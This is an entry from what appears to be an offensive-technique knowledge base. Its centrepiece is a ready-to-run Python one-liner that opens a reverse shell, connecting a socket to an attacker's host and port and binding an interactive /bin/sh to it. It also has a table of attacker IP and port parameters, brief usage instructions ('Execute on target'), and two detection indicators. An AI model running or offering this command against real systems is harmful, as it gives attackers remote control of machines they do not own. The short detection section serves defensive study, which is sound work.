---
id: 81aa18a1-632c-46da-9c58-b323bf2d3321
type: code
language: Python
verified: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
tags:
  - reverse-shell
  - python
  - subprocess
validated: true
---

# Python-Reverse-Shell-Subprocess-Fileno-Redirect

## Code

```python
python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
```

## Description

Establishes a socket and directly passes file descriptors to subprocess.call for /bin/sh -i, enabling interactive shell without dup2.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $_ATTACKER_IP | Attacker's IPv4 address | 10.0.0.1 |
| $_ATTACKER_PORT | Attacker's listening port | 4242 |

## Usage

Execute on target; listener required. Simpler variant for environments restricting dup2.

## Detection

- Subprocess with stdin/stdout/stderr set to socket fileno.
- Python socket to external host.

## Related

- [[procedures/Establish-Python-Reverse-Shell]]
